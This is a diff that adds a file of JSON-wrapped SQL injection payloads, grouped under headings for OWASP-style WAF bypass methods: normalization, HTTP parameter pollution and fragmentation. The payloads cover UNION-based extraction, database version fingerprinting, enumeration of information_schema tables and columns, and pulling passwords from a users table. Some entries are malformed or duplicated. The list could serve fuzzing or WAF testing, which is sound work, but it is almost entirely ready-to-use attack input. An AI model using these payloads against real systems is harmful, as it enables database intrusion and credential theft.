@@ -1,0 +1,50 @@
+{"ID":"1"}
+{"ID":"1\"}
+{"ID":"1' UNION SELECT @--+"}
+{"ID":"1 UNION SELECT @,@,@--+"}
+{"ID":"1' AND (SELECT *)"}
+{"ID":"1' LIMIT 1,1 INTO @--+"}
+{"ID":"1' LIMIT 1,1 INTO @,@--+"}
+{"ID":"1' LIMIT 1,1 INTO @,@,@--+"}
+{"ID":"1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a"}
+{"ID":"1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a"}
+{"ID":"1 and substring(version(),1,1)=5"}
+{"ID":"1 and right(left(version(),1),1)=5"}
+{"ID":"1 and left(version(),1)=4"}
+{"ID":"1' UNION SELECT * FROM (SELECT 1) JOIN (SELECT table_name FROM mysql.innodb_table_stats)"}
+{"ID":"1' UNION SELECT * FROM (SELECT 1) JOIN (SELECT 2)"}
+{"ID": "1' union select * from ((select 1)A join (select \'{}\')B);#"}
+{"ID":"'-1/uNIoN sELecT table_schema, table_name, 1 FROM information_schema.tables #'"}
+{"ID":"'-1/uNIoN sELecT table_name, column_name, 1 FROM information_schema.columns #'"}
+
+OWASP
+
+Bypassing WAF: SQL Injection - Normalization Method
+
+{"ID":"-1*/UNION /SELECT table_schema, table_name, 1 FROM information_schema.tables"}
+{"ID":"-1/SELECT 'Ä'='A'; #1"}
+{"ID":"SELECT * from table where id = 1 union select 1,2,3"}
+{"ID":"1/*union*/union/*select*/select+1,2,3/*"}
+{"ID":"1+union+select+1,2,3/*"}
+{"ID":"1/*uni X on*/union/*sel X ect*/select+1,2,3/*"}
+{"ID":"1+union+select+1,2,3/*"}
+{"ID":"1+un/**/ion+sel/**/ect+1,2,3--"}
+{"ID":"SELECT * from table where id =1 union select 1,2,3--"}
+
+Using HTTP Parameter Pollution (HPP)
+
+{"ID":"1;select+1,2,3+from+users+where+id=1--"}
+{"ID":"1;select+1&id=2,3+from+users+where+id=1--"}
+
+Using HTTP Parameter Pollution (HPP)
+
+{"ID":"select key from table where id= "+Request.QueryString("id")"}
+{"ID":"1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users"}
+{"ID":"1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users"}
+
+ByPassing WAF: SQL Injection – HPF
+
+{"ID":"+union+select+1,2/*"}
+{"ID":"+union/*&b=*/select+1,2  /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--"}
+{"ID":"select * from table where a=1 union/* and b=*/select 1,2"}
+{"ID":"select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users--"}
